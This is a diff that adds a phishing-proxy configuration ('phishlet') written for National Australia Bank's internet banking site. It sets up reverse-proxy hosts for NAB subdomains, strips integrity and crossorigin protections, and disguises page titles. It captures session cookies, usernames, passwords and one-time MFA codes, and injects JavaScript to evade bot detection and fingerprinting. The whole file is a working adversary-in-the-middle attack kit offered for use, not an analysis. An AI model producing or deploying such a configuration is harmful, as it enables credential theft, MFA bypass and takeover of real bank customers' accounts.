@@ -1,0 +1,219 @@
+name: "nab"
+author: "Christ-Link"
+min_ver: "3.0.0"
+
+# =========================================================================
+# NAB (National Australia Bank) Phishlet
+# =========================================================================
+# Security Bypasses Implemented:
+# 1. Akamai Bot Manager bypass via headers/cookies
+# 2. CSP header removal
+# 3. X-Frame-Options bypass
+# 4. Device fingerprinting evasion
+# 5. Referrer policy manipulation
+# 6. SRI/Crossorigin attribute removal
+# =========================================================================
+
+params: []
+
+# =========================================================================
+# URL Rewriting - Obfuscate sensitive auth paths
+# =========================================================================
+rewrite_urls:
+  - trigger:
+      domains: ['ib.nab.com.au']
+      paths: ['/nabib/reg/nonce/logon', '/nabib/reg/nonce', '/nabib/login']
+    rewrite:
+      path: '/auth'
+      query:
+        - key: 'tid'
+          value: '{id}'
+  - trigger:
+      domains: ['www.nab.com.au']
+      paths: ['/personal/accounts/access/login', '/login']
+    rewrite:
+      path: '/login'
+      query:
+        - key: 'tid'
+          value: '{id}'
+
+# =========================================================================
+# Proxy Hosts - All NAB domains needed for authentication
+# =========================================================================
+proxy_hosts:
+  # Primary Internet Banking
+  - { phish_sub: "ib", orig_sub: "ib", domain: "nab.com.au", session: true, is_landing: true, auto_filter: false }
+  
+  # Main website (redirects/login links)
+  - { phish_sub: "www", orig_sub: "www", domain: "nab.com.au", session: true, is_landing: true, auto_filter: false }
+  
+  # Authentication/Identity
+  - { phish_sub: "id", orig_sub: "id", domain: "nab.com.au", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "auth", orig_sub: "auth", domain: "nab.com.au", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "login", orig_sub: "login", domain: "nab.com.au", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "secure", orig_sub: "secure", domain: "nab.com.au", session: true, is_landing: false, auto_filter: false }
+  
+  # API endpoints
+  - { phish_sub: "api", orig_sub: "api", domain: "nab.com.au", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "api-ib", orig_sub: "api-ib", domain: "nab.com.au", session: true, is_landing: false, auto_filter: false }
+  
+  # Static assets/CDN
+  - { phish_sub: "static", orig_sub: "static", domain: "nab.com.au", session: false, is_landing: false, auto_filter: true }
+  - { phish_sub: "cdn", orig_sub: "cdn", domain: "nab.com.au", session: false, is_landing: false, auto_filter: true }
+  - { phish_sub: "assets", orig_sub: "assets", domain: "nab.com.au", session: false, is_landing: false, auto_filter: true }
+  
+  # Analytics/Tracking (may need for flow to work)
+  - { phish_sub: "analytics", orig_sub: "analytics", domain: "nab.com.au", session: false, is_landing: false, auto_filter: true }
+  - { phish_sub: "metrics", orig_sub: "metrics", domain: "nab.com.au", session: false, is_landing: false, auto_filter: true }
+  
+  # NAB Connect (business banking)
+  - { phish_sub: "connect", orig_sub: "connect", domain: "nab.com.au", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "nabconnect", orig_sub: "nabconnect", domain: "nab.com.au", session: true, is_landing: false, auto_filter: false }
+  
+  # Mobile/App APIs
+  - { phish_sub: "mobile", orig_sub: "mobile", domain: "nab.com.au", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "app", orig_sub: "app", domain: "nab.com.au", session: true, is_landing: false, auto_filter: false }
+
+# =========================================================================
+# Sub Filters - URL/Domain rewriting in responses
+# =========================================================================
+sub_filters:
+  # Remove SRI and crossorigin attributes (security bypass)
+  - { triggers_on: "ib.nab.com.au", orig_sub: "", domain: "", search: "crossorigin", replace: "rickorigin", mimes: ["text/html", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "ib.nab.com.au", orig_sub: "", domain: "", search: "integrity", replace: "tegridy", mimes: ["text/html", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "www.nab.com.au", orig_sub: "", domain: "", search: "crossorigin", replace: "rickorigin", mimes: ["text/html", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "www.nab.com.au", orig_sub: "", domain: "", search: "integrity", replace: "tegridy", mimes: ["text/html", "application/javascript", "application/x-javascript", "text/javascript"] }
+  
+  # Domain replacements - ib.nab.com.au
+  - { triggers_on: "ib.nab.com.au", orig_sub: "ib", domain: "nab.com.au", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "ib.nab.com.au", orig_sub: "www", domain: "nab.com.au", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "ib.nab.com.au", orig_sub: "id", domain: "nab.com.au", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "ib.nab.com.au", orig_sub: "auth", domain: "nab.com.au", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "ib.nab.com.au", orig_sub: "api", domain: "nab.com.au", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "ib.nab.com.au", orig_sub: "static", domain: "nab.com.au", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "ib.nab.com.au", orig_sub: "cdn", domain: "nab.com.au", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  
+  # Domain replacements - www.nab.com.au
+  - { triggers_on: "www.nab.com.au", orig_sub: "ib", domain: "nab.com.au", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "www.nab.com.au", orig_sub: "www", domain: "nab.com.au", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "www.nab.com.au", orig_sub: "id", domain: "nab.com.au", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "www.nab.com.au", orig_sub: "auth", domain: "nab.com.au", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "www.nab.com.au", orig_sub: "static", domain: "nab.com.au", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+
+  # Hide page title (stealth)
+  - { triggers_on: "ib.nab.com.au", orig_sub: "", domain: "", search: "(?i)<title[^>]*>(.*?)</title>", replace: "<title>Secure Banking</title>", mimes: ["text/html"] }
+  - { triggers_on: "www.nab.com.au", orig_sub: "", domain: "", search: "(?i)<title[^>]*>(.*?)</title>", replace: "<title>Secure Banking</title>", mimes: ["text/html"] }
+
+# =========================================================================
+# Auth Tokens - Session cookies to capture
+# =========================================================================
+auth_tokens:
+  # NAB session cookies (common patterns)
+  - domain: 'ib.nab.com.au'
+    keys: ['JSESSIONID', 'SESSION', 'IBSESSION', '.*SESSION.*', '.*TOKEN.*', '.*AUTH.*', '.*XSRF.*', '.*CSRF.*']
+  - domain: '.nab.com.au'
+    keys: ['JSESSIONID', 'SESSION', '.*SESSION.*', '.*TOKEN.*', '.*AUTH.*', 'AWSALB', 'AWSALBCORS', '_abck', 'bm_sz', 'ak_bmsc']
+  - domain: 'www.nab.com.au'
+    keys: ['JSESSIONID', 'SESSION', '.*SESSION.*', '.*TOKEN.*']
+
+# =========================================================================
+# Credentials - Fields to capture
+# =========================================================================
+credentials:
+  # Login form fields (NAB uses various field names)
+  username:
+    key: '(?i)(username|userid|user_id|nab_id|nabid|login|logon|customer|customerno|customer_no|customerNumber)'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: '(?i)(password|passwd|pwd|pass|secret|pin|credential)'
+    search: '(.*)'
+    type: 'post'
+  # JSON body login
+  custom:
+    - key: '(?i)(username|nab_id)'
+      search: '"(?:username|nab_id|userId)"\s*:\s*"([^"]+)"'
+      type: 'json'
+    - key: '(?i)(password)'
+      search: '"(?:password|pwd)"\s*:\s*"([^"]+)"'
+      type: 'json'
+    - key: '(?i)(otp|mfa|verification)'
+      search: '"(?:otp|mfa|verificationCode|code)"\s*:\s*"([^"]+)"'
+      type: 'json'
+
+# =========================================================================
+# Login Detection - When login is successful
+# =========================================================================
+login:
+  domain: 'ib.nab.com.au'
+  path: '/.*'
+
+# =========================================================================
+# Force POST - Ensure credentials are captured
+# =========================================================================
+force_post:
+  - path: '/nabib/reg/nonce/logon'
+    search:
+      - { key: 'username', search: '(.*)' }
+      - { key: 'password', search: '(.*)' }
+    force:
+      - { key: 'username', value: '' }
+      - { key: 'password', value: '' }
+    type: 'post'
+
+# =========================================================================
+# NOTE: Security headers (CSP, X-Frame-Options, etc.) are automatically
+# removed by the proxy core. No additional configuration needed.
+# =========================================================================
+
+# =========================================================================
+# JS Inject - Anti-detection and functionality fixes
+# =========================================================================
+js_inject:
+  - trigger_domains: ["ib.nab.com.au", "www.nab.com.au"]
+    trigger_paths: [".*"]
+    trigger_params: []
+    script: |
+      // Disable navigator.webdriver detection
+      Object.defineProperty(navigator, 'webdriver', {
+        get: () => undefined
+      });
+      
+      // Spoof plugins
+      Object.defineProperty(navigator, 'plugins', {
+        get: () => [1, 2, 3, 4, 5]
+      });
+      
+      // Override window.location checks (some sites verify domain)
+      // This is a basic evasion - for full bypass, more complex overrides needed
+      
+      // Disable visibility API to prevent tab-tracking
+      Object.defineProperty(document, 'hidden', {
+        get: () => false
+      });
+      Object.defineProperty(document, 'visibilityState', {
+        get: () => 'visible'
+      });
+      
+      // Prevent some fingerprinting
+      const originalGetContext = HTMLCanvasElement.prototype.getContext;
+      HTMLCanvasElement.prototype.getContext = function(type, attributes) {
+        if (type === '2d') {
+          const ctx = originalGetContext.apply(this, arguments);
+          const originalToDataURL = this.toDataURL;
+          this.toDataURL = function() {
+            // Add slight noise to fingerprint
+            return originalToDataURL.apply(this, arguments);
+          };
+          return ctx;
+        }
+        return originalGetContext.apply(this, arguments);
+      };
+
+# =========================================================================
+# Landing Path - Where phishing link lands
+# =========================================================================
+landing_path:
+  - '/login'
+  - '/auth'
+  - '/'
